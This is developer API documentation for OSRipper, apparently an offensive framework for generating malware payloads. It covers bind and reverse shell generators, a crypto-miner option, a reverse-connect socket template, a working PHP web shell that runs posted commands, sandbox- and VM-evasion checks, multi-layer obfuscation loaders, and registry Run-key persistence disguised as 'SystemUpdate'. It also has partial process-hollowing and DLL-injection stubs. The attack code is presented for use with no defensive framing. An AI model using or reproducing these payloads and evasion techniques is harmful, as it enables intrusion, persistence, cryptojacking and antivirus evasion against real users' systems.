# OSRipper API Documentation

This document provides comprehensive API documentation for OSRipper v0.3.1, enabling developers to integrate and extend the framework.

## Table of Contents

- [Core Classes](#core-classes)
- [Configuration API](#configuration-api)
- [Logging API](#logging-api)
- [Payload Generation](#payload-generation)
- [Obfuscation Engine](#obfuscation-engine)
- [CLI Integration](#cli-integration)
- [Extension Development](#extension-development)

## Core Classes

### OSRipperConfig

Main configuration management class.

```python
from config import OSRipperConfig

# Initialize with defaults
config = OSRipperConfig()

# Generate random variables for obfuscation
random_vars = config.generate_random_variables()

# Generate random string
random_string = config.generate_random_string(16)
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `generate_random_variables()` | Generate randomization values | None | `Dict[str, Any]` |
| `generate_random_string(length)` | Generate random string | `length: int` | `str` |

#### Properties

| Property | Type | Description |
|----------|------|-------------|
| `bind_mode` | `bool` | Enable bind mode |
| `encrypted` | `bool` | Encryption status |
| `host` | `Optional[str]` | Target host |
| `port` | `Optional[str]` | Target port |
| `name` | `str` | Output filename |
| `output_dir` | `Path` | Output directory |

### PayloadGenerator

Main payload generation engine.

```python
from main import PayloadGenerator, OSRipperConfig

config = OSRipperConfig()
generator = PayloadGenerator(config)

# Display logo
generator.display_logo()

# Validate input
valid_port = generator.validate_port("4444")
valid_ip = generator.validate_ip("192.168.1.100")
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `display_logo()` | Show ASCII art logo | None | None |
| `validate_port(port)` | Validate port number | `port: str` | `bool` |
| `validate_ip(ip)` | Validate IP address | `ip: str` | `bool` |
| `generate_bind_backdoor()` | Create bind shell | None | None |
| `generate_reverse_tcp_meterpreter()` | Create reverse shell | None | None |
| `generate_btc_miner()` | Create crypto miner | None | None |

## Configuration API

### ConfigManager

Advanced configuration management with YAML/JSON support.

```python
from config import ConfigManager

# Initialize with config file
config = ConfigManager("osripper.yml")

# Get configuration values
output_dir = config.get("general.output_dir", "dist")
obfuscate = config.get("payload.auto_obfuscate", True)

# Set configuration values
config.set("network.default_port", 4444)

# Save configuration
config.save_config()
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `load_config()` | Load config from file | None | `bool` |
| `save_config(file_path)` | Save config to file | `file_path: Optional[str]` | `bool` |
| `get(key, default)` | Get config value | `key: str, default: Any` | `Any` |
| `set(key, value)` | Set config value | `key: str, value: Any` | None |
| `validate_config()` | Validate configuration | None | `bool` |
| `create_sample_config(path)` | Create sample config | `path: str` | `bool` |

#### Configuration Sections

```python
# Get section-specific configs
payload_config = config.get_payload_config()
network_config = config.get_network_config()
compilation_config = config.get_compilation_config()
evasion_config = config.get_evasion_config()
```

### Example Configuration Usage

```python
from config import ConfigManager

# Load configuration
config = ConfigManager("custom.yml")

# Payload settings
payload_settings = {
    'name': config.get('payload.default_name', 'backdoor'),
    'obfuscate': config.get('payload.auto_obfuscate', True),
    'layers': config.get('payload.obfuscation_layers', 5)
}

# Network settings
network_settings = {
    'host': config.get('network.default_host', 'localhost'),
    'port_range': config.get('network.default_port_range', [4444, 8888]),
    'ssl': config.get('network.use_ssl', True)
}

# Apply settings
if payload_settings['obfuscate']:
    apply_obfuscation(payload_settings['layers'])
```

## Logging API

### OSRipperLogger

Advanced logging system with multiple handlers.

```python
from logger import OSRipperLogger, get_logger, log_operation

# Get global logger instance
logger = get_logger()

# Basic logging
logger.info("Operation started")
logger.error("Operation failed", error_code=500)

# Specialized logging
logger.payload_generated("reverse_tcp", "192.168.1.100:4444")
logger.connection_established("192.168.1.100", 4444)
logger.security_event("vm_detection", "VirtualBox detected")
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `info(message, **kwargs)` | Log info message | `message: str, **kwargs` | None |
| `error(message, **kwargs)` | Log error message | `message: str, **kwargs` | None |
| `warning(message, **kwargs)` | Log warning message | `message: str, **kwargs` | None |
| `payload_generated(type, target, **kwargs)` | Log payload creation | `type: str, target: str` | None |
| `connection_attempt(host, port, **kwargs)` | Log connection attempt | `host: str, port: int` | None |
| `security_event(event, details, **kwargs)` | Log security events | `event: str, details: str` | None |

#### Operation Logging Decorator

```python
from logger import log_operation

@log_operation("payload_generation", payload_type="reverse_tcp")
def generate_payload(host, port):
    # Payload generation logic
    return create_reverse_payload(host, port)

# Usage
payload = generate_payload("192.168.1.100", 4444)
```

#### Context Manager

```python
from logger import OperationLogger, get_logger

logger = get_logger()

with OperationLogger(logger, "compilation", compiler="nuitka"):
    compile_payload("payload.py")
    # Automatically logs start/completion/failure
```

## Payload Generation

### Core Functions

```python
from main import (
    gen_bind, gen_rev_ssl_tcp, gen_custom, 
    gen_btc_miner, validate_port, validate_ip
)

# Input validation
if validate_port("4444") and validate_ip("192.168.1.100"):
    # Generate reverse shell
    gen_rev_ssl_tcp()
```

### Custom Payload Development

Create custom payload generators:

```python
def generate_custom_payload(config):
    """Generate custom payload with specific requirements."""
    
    # Validate configuration
    if not config.host or not config.port:
        raise ValueError("Host and port required")
    
    # Generate payload template
    payload_template = f"""
import socket
import ssl
import base64
import zlib

def connect_back():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{config.host}', {config.port}))
        
        if {config.use_ssl}:
            s = ssl.wrap_socket(s)
        
        # Custom payload logic here
        execute_commands(s)
        
    except Exception:
        pass

def execute_commands(socket):
    # Command execution logic
    pass

if __name__ == "__main__":
    connect_back()
"""
    
    # Apply obfuscation if enabled
    if config.obfuscate:
        payload_template = apply_obfuscation(payload_template)
    
    # Write to file
    with open(config.output_file, 'w') as f:
        f.write(payload_template)
    
    return config.output_file
```

### Payload Templates

Define reusable payload templates:

```python
PAYLOAD_TEMPLATES = {
    'reverse_tcp': """
import socket
import ssl
import struct
import {imports}

{anti_debug_code}

def main():
    {connection_code}
    {execution_code}

if __name__ == "__main__":
    main()
""",
    
    'bind_tcp': """
import socket
import struct
import {imports}

{anti_vm_code}

def main():
    {bind_code}
    {execution_code}

if __name__ == "__main__":
    main()
""",
    
    'miner': """
import socket
import json
import hashlib
import {imports}

{stealth_code}

def mine():
    {mining_code}

if __name__ == "__main__":
    mine()
"""
}

def generate_from_template(template_name, **kwargs):
    """Generate payload from template."""
    template = PAYLOAD_TEMPLATES[template_name]
    return template.format(**kwargs)
```

## Obfuscation Engine

### AdvancedObfuscator

Multi-layer obfuscation system.

```python
from obfuscator_enhanced import AdvancedObfuscator

# Initialize obfuscator
obfuscator = AdvancedObfuscator()

# Obfuscate file
success = obfuscator.obfuscate_file("input.py", "output.py")

if success:
    print("Obfuscation completed successfully")
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `obfuscate_file(input, output)` | Obfuscate Python file | `input: str, output: str` | `bool` |
| `add_anti_debug(code)` | Add anti-debug code | `code: str` | `str` |
| `add_vm_detection(code)` | Add VM detection | `code: str` | `str` |
| `obfuscate_strings(code)` | Obfuscate string literals | `code: str` | `str` |
| `add_junk_code(code)` | Add junk code | `code: str` | `str` |

#### Custom Obfuscation

```python
from obfuscator_enhanced import AdvancedObfuscator

class CustomObfuscator(AdvancedObfuscator):
    def add_custom_evasion(self, code):
        """Add custom evasion techniques."""
        custom_evasion = """
# Custom anti-analysis code
import time
import random

def check_environment():
    # Custom environment checks
    start_time = time.time()
    
    # Perform dummy operations
    for i in range(1000):
        random.randint(1, 100)
    
    # Check execution time
    if time.time() - start_time < 0.1:
        exit(0)  # Likely running in sandbox

check_environment()
"""
        return custom_evasion + code
    
    def obfuscate_file(self, input_file, output_file):
        # Read input
        with open(input_file, 'r') as f:
            code = f.read()
        
        # Apply custom evasion
        code = self.add_custom_evasion(code)
        
        # Apply standard obfuscation
        return super().obfuscate_file_content(code, output_file)

# Usage
custom_obfuscator = CustomObfuscator()
custom_obfuscator.obfuscate_file("payload.py", "obfuscated.py")
```

### Encoding Functions

```python
from obfuscator_enhanced import AdvancedObfuscator

obfuscator = AdvancedObfuscator()

# Multi-layer encoding
encoded = obfuscator.encode_with_multiple_layers("print('hello')", layers=5)

# Create dynamic loader
loader = obfuscator.create_dynamic_loader(encoded)

# Write final payload
with open("final_payload.py", 'w') as f:
    f.write(loader)
```

## CLI Integration

### Command Line Parser

```python
from cli import create_parser, validate_args, execute_bind

# Create parser
parser = create_parser()

# Parse arguments
args = parser.parse_args(['bind', '-p', '4444', '--obfuscate'])

# Validate arguments
if validate_args(args):
    # Execute command
    success = execute_bind(args)
```

### Custom CLI Commands

Extend the CLI with custom commands:

```python
def add_custom_command(subparsers):
    """Add custom command to CLI."""
    custom_parser = subparsers.add_parser('custom', help='Custom payload')
    custom_parser.add_argument('--type', required=True, choices=['web', 'mobile'])
    custom_parser.add_argument('--target', required=True)
    
    return custom_parser

def execute_custom(args):
    """Execute custom command."""
    if args.type == 'web':
        return generate_web_payload(args.target)
    elif args.type == 'mobile':
        return generate_mobile_payload(args.target)
    
    return False

# Integration example
def main_cli_extended():
    parser = create_parser()
    subparsers = parser._subparsers._group_actions[0]
    
    # Add custom command
    add_custom_command(subparsers)
    
    args = parser.parse_args()
    
    if args.command == 'custom':
        return execute_custom(args)
    
    # Handle standard commands
    return handle_standard_commands(args)
```

## Extension Development

### Plugin Architecture

Create plugins for OSRipper:

```python
class OSRipperPlugin:
    """Base class for OSRipper plugins."""
    
    def __init__(self, name, version):
        self.name = name
        self.version = version
    
    def initialize(self, config):
        """Initialize plugin with configuration."""
        pass
    
    def generate_payload(self, **kwargs):
        """Generate payload (override in subclass)."""
        raise NotImplementedError
    
    def post_process(self, payload_file):
        """Post-process generated payload."""
        return payload_file

class WebShellPlugin(OSRipperPlugin):
    """Web shell payload plugin."""
    
    def __init__(self):
        super().__init__("WebShell", "1.0")
    
    def generate_payload(self, language="php", **kwargs):
        """Generate web shell payload."""
        
        if language == "php":
            return self._generate_php_shell(**kwargs)
        elif language == "jsp":
            return self._generate_jsp_shell(**kwargs)
        else:
            raise ValueError(f"Unsupported language: {language}")
    
    def _generate_php_shell(self, **kwargs):
        """Generate PHP web shell."""
        php_shell = """<?php
if(isset($_POST['cmd'])){
    echo "<pre>";
    $cmd = ($_POST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
<form method="post">
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>"""
        
        return php_shell

# Plugin registration
PLUGINS = {
    'webshell': WebShellPlugin(),
    # Add more plugins here
}

def load_plugin(name):
    """Load plugin by name."""
    if name in PLUGINS:
        return PLUGINS[name]
    else:
        raise ValueError(f"Plugin not found: {name}")

# Usage
webshell_plugin = load_plugin('webshell')
php_payload = webshell_plugin.generate_payload(language="php")
```

### Custom Evasion Techniques

Implement custom evasion methods:

```python
class EvasionTechniques:
    """Custom evasion technique implementations."""
    
    @staticmethod
    def add_process_hollowing(code):
        """Add process hollowing technique."""
        hollowing_code = """
import subprocess
import os

def hollow_process():
    # Create suspended process
    proc = subprocess.Popen(['notepad.exe'], 
                          creationflags=0x00000004)  # CREATE_SUSPENDED
    
    # Hollow and inject code
    # Implementation details...
    
    return proc

# Execute in hollow process
hollow_process()
"""
        return hollowing_code + code
    
    @staticmethod
    def add_dll_injection(code):
        """Add DLL injection technique."""
        injection_code = """
import ctypes
from ctypes import wintypes

def inject_dll(process_id, dll_path):
    # Open target process
    process = ctypes.windll.kernel32.OpenProcess(
        0x1F0FFF, False, process_id)
    
    # Allocate memory and inject DLL
    # Implementation details...
    
    return True

# Perform DLL injection
inject_dll(target_pid, "payload.dll")
"""
        return injection_code + code
    
    @staticmethod
    def add_registry_persistence(code):
        """Add registry persistence."""
        persistence_code = """
import winreg

def add_persistence(exe_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, winreg.KEY_SET_VALUE)
    
    winreg.SetValueEx(key, "SystemUpdate", 0, 
                     winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

# Add to startup
add_persistence(__file__)
"""
        return persistence_code + code

# Usage in obfuscator
def apply_advanced_evasion(code, techniques):
    """Apply advanced evasion techniques."""
    evasion = EvasionTechniques()
    
    if 'process_hollowing' in techniques:
        code = evasion.add_process_hollowing(code)
    
    if 'dll_injection' in techniques:
        code = evasion.add_dll_injection(code)
    
    if 'registry_persistence' in techniques:
        code = evasion.add_registry_persistence(code)
    
    return code
```

### Integration Example

Complete integration example:

```python
from config import ConfigManager
from logger import get_logger
from obfuscator_enhanced import AdvancedObfuscator

class CustomPayloadGenerator:
    """Custom payload generator with full integration."""
    
    def __init__(self, config_file=None):
        self.config = ConfigManager(config_file)
        self.logger = get_logger()
        self.obfuscator = AdvancedObfuscator()
    
    def generate(self, payload_type, **kwargs):
        """Generate payload with full integration."""
        
        # Log operation start
        self.logger.operation_start("payload_generation", 
                                   payload_type=payload_type)
        
        try:
            # Generate base payload
            if payload_type == "reverse_tcp":
                payload = self._generate_reverse_tcp(**kwargs)
            elif payload_type == "web_shell":
                payload = self._generate_web_shell(**kwargs)
            else:
                raise ValueError(f"Unsupported payload type: {payload_type}")
            
            # Apply obfuscation if configured
            if self.config.get("payload.auto_obfuscate", True):
                layers = self.config.get("payload.obfuscation_layers", 5)
                payload = self._apply_obfuscation(payload, layers)
            
            # Save payload
            output_file = self._save_payload(payload, **kwargs)
            
            # Log success
            self.logger.payload_generated(payload_type, output_file)
            self.logger.operation_complete("payload_generation")
            
            return output_file
            
        except Exception as e:
            self.logger.operation_failed("payload_generation", str(e))
            raise
    
    def _generate_reverse_tcp(self, host, port, **kwargs):
        """Generate reverse TCP payload."""
        # Implementation
        pass
    
    def _apply_obfuscation(self, payload, layers):
        """Apply obfuscation with specified layers."""
        # Implementation
        pass
    
    def _save_payload(self, payload, **kwargs):
        """Save payload to file."""
        # Implementation
        pass

# Usage
generator = CustomPayloadGenerator("custom.yml")
payload_file = generator.generate("reverse_tcp", 
                                host="192.168.1.100", 
                                port=4444)
```

This completes the comprehensive API documentation for OSRipper v0.3.1. The API provides extensive customization and extension capabilities for advanced users and developers.
